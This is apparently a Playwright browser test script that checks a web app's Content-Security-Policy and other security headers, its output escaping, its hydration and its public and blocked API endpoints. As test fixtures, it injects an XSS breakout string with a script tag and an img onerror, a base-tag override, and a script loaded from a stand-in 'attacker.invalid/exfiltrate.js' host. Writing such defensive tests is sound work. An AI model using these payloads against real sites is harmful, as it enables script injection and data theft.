import {createRequire} from 'node:module';
import path from 'node:path';
import assert from 'node:assert/strict';
import {writeFile} from 'node:fs/promises';

const [toolchain, chrome, origin, home, wrongMime, receipt, mode = 'assets-only'] = process.argv.slice(2);
assert.ok(['assets-only', 'public-application'].includes(mode));
const {chromium} = createRequire(path.join(path.resolve(toolchain), 'package.json'))('playwright-core');
const browser = await chromium.launch({executablePath: chrome, headless: true,
  args: process.platform === 'linux' && process.getuid() === 0 ? ['--no-sandbox'] : []});
const watchdog = setTimeout(() => { process.exitCode = 1; browser.close(); }, 60000);
try {
  const context = await browser.newContext();
  const page = await context.newPage();
  const errors = [];
  page.on('pageerror', error => { if (errors.length < 8) errors.push(error.name); });
  const loaded = await page.goto(origin + home, {waitUntil: 'networkidle', timeout: 15000});
  assert.equal(loaded.status(), 200);
  const headers = loaded.headers();
  assert.match(headers['content-security-policy'], /script-src 'self'/);
  assert.match(headers['content-security-policy'], /base-uri 'none'/);
  assert.equal(headers['x-content-type-options'], 'nosniff');
  assert.equal(headers['cross-origin-resource-policy'], 'same-origin');
  assert.equal(headers['referrer-policy'], 'same-origin');
  assert.ok(!headers['access-control-allow-origin']);
  await page.waitForFunction(() => globalThis.boundaryHydrated === true, null, {timeout: 15000});
  const expected = '</ScRiPt><script>globalThis.breakout=true</script><img src=x onerror=globalThis.breakout=true>&\u2028\u2029';
  assert.equal(await page.locator('#greeting').textContent(), 'Hello ' + expected);
  assert.equal(await page.evaluate(() => globalThis.breakout), undefined);
  assert.equal(await page.locator('#page').textContent(), 'Home');
  assert.equal(await page.evaluate(async url => (await fetch(url, {method: 'POST', mode: 'same-origin', body: ''})).status, origin + home), 405);
  await page.locator('#count').click();
  await page.waitForFunction(() => document.getElementById('count').textContent === 'Count 1', null, {timeout: 5000});
  if (mode === 'public-application') {
    await context.addCookies([{name: 'browserFixtureState', value: 'not-authentication', url: origin}]);
    const [applicationRequest, applicationResponse] = await Promise.all([
      page.waitForRequest(request => request.url() === origin + '/api/greeting', {timeout: 10000}),
      page.waitForResponse(response => response.url() === origin + '/api/greeting', {timeout: 10000}),
      page.locator('#public-greeting').click(),
    ]);
    await page.waitForFunction(() => document.getElementById('public-result').textContent === 'Hello Browser', null, {timeout: 5000});
    assert.equal(applicationRequest.method(), 'POST');
    assert.equal(applicationRequest.postData(), '{"name":"Browser"}');
    const requestHeaders = await applicationRequest.allHeaders();
    assert.equal(requestHeaders.origin, origin);
    assert.equal(requestHeaders.authorization, undefined);
    assert.equal(requestHeaders.cookie, undefined);
    assert.equal(applicationResponse.status(), 200);
    assert.equal(applicationResponse.headers()['x-app-principal'], 'browser-fixture');
    assert.equal(applicationResponse.headers()['cache-control'], 'no-store');
    assert.equal(applicationResponse.headers()['access-control-allow-origin'], undefined);
    for (const forbidden of ['/latent.invocation.v1.InvocationService/Invoke',
      '/latent.control.v1.PolicyService/ApplyPolicy', '/admin', '/api/greeting/extra']) {
      assert.equal(await page.evaluate(async target => (await fetch(target, {
        method: 'POST', mode: 'same-origin', credentials: 'omit', body: '', redirect: 'error',
      })).status, forbidden), 404);
    }
    assert.equal(await page.evaluate(async () => (await fetch('/api/greeting', {
      method: 'GET', mode: 'same-origin', credentials: 'omit',
    })).status), 404);
    assert.equal(await page.evaluate(async () => (await fetch('/api/greeting', {
      method: 'POST', mode: 'same-origin', credentials: 'omit', body: '{"name":"Browser"}',
      headers: {'content-type': 'application/json', authorization: 'Bearer synthetic-not-a-credential'},
    })).status), 401);
    const anonymous = await page.evaluate(async () => {
      const response = await fetch('/api/greeting', {
        method: 'POST', mode: 'same-origin', credentials: 'include', body: '{"name":"Browser"}',
        headers: {'content-type': 'application/json'}, redirect: 'error', cache: 'no-store',
      });
      return {status: response.status, principal: response.headers.get('x-app-principal'), body: await response.json()};
    });
    assert.deepEqual(anonymous, {status: 200, principal: 'browser-fixture', body: {greeting: 'Hello Browser'}});
  }
  await page.evaluate(async wrongMime => {
    globalThis.violations = [];
    document.addEventListener('securitypolicyviolation', event => {
      if (globalThis.violations.length < 16) globalThis.violations.push({
        directive: event.effectiveDirective, blocked: event.blockedURI});
    });
    const inline = document.createElement('script');
    inline.textContent = 'globalThis.inlineExecuted=true';
    document.body.append(inline);
    const base = document.createElement('base');
    base.href = 'https://attacker.invalid/';
    document.head.append(base);
    const remote = document.createElement('script');
    remote.src = 'https://attacker.invalid/exfiltrate.js';
    document.body.append(remote);
    const wrong = document.createElement('script');
    wrong.src = wrongMime;
    await new Promise(resolve => { wrong.onload = resolve; wrong.onerror = resolve; document.body.append(wrong); });
  }, wrongMime);
  await page.waitForFunction(() => globalThis.violations.some(event => event.directive === 'base-uri') &&
    globalThis.violations.some(event => event.directive === 'script-src-elem' && event.blocked === 'inline') &&
    globalThis.violations.some(event => event.directive === 'script-src-elem' && event.blocked.startsWith('https://attacker.invalid')),
  null, {timeout: 5000});
  assert.equal(await page.evaluate(() => globalThis.inlineExecuted), undefined);
  assert.equal(await page.evaluate(() => globalThis.mimeExecuted), undefined);
  assert.equal(await page.evaluate(() => document.baseURI), origin + home);
  await Promise.all([page.waitForURL('**/next.html', {timeout: 15000}), page.locator('#next').click()]);
  await page.waitForFunction(() => globalThis.boundaryHydrated === true, null, {timeout: 15000});
  assert.equal(await page.locator('#page').textContent(), 'Next');
  assert.equal(await page.locator('#greeting').textContent(), 'Hello ' + expected);
  assert.deepEqual(errors, []);
  const observations = {browser: browser.version(), liveSharedIngress: true,
    controlledNodeSsr: true, componentRenderClaimed: false, originalDomReused: true,
    publicApplicationQualified: mode === 'public-application',
    applicationComponentInvoked: mode === 'public-application',
    managementRpcAbsent: mode === 'public-application',
    browserFetchCredentialsOmitted: mode === 'public-application',
    cookiesDoNotAuthenticate: mode === 'public-application',
    navigationHydrated: true, escapedDataRoundTrip: true, inlineAndRemoteScriptsBlocked: true,
    baseOverrideBlocked: true, wrongScriptMimeBlocked: true, sameOriginPostReachedMethodPolicy: true, errors: errors.length};
  await writeFile(receipt, JSON.stringify(observations));
  console.log(JSON.stringify(observations));
  await context.close();
} finally {
  clearTimeout(watchdog);
  await browser.close();
}
